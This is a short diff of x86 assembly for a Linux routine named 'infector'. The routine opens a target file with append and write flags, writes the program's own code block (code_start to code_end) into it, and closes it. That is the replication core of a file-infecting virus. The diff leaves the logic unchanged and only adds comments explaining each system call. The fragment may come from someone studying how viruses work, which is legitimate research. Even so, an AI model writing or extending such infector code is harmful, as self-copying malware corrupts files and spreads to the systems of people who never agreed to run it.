@@ -65,20 +65,20 @@ infector:
     push ebp              		; save Base Pointer (bp) original value
     mov ebp, esp
     pushad
-    mov ebx, dword [ebp+8]
-    mov eax,5
-    mov ecx,1025
+    mov ebx, dword [ebp+8] ;pathname in ebx
+    mov eax,5  ;open
+    mov ecx,1025  ;append and write 
     mov edx, 0777
-    int 0x80
-    mov ebx,eax
-    mov eax , 4
+    int 0x80  ;open the file
+    mov ebx,eax ; the file descriptor to ebx
+    mov eax , 4 ; write
     mov ecx , code_start
     mov edx, code_end
     sub edx ,code_start
     push ebx
     int 0x80
     pop ebx
-    mov eax,6
+    mov eax, 6 ;close
     int 0x80
     popad                    	; restore all previously used registers
     mov eax,0         		; return value 0 no error oucrired 
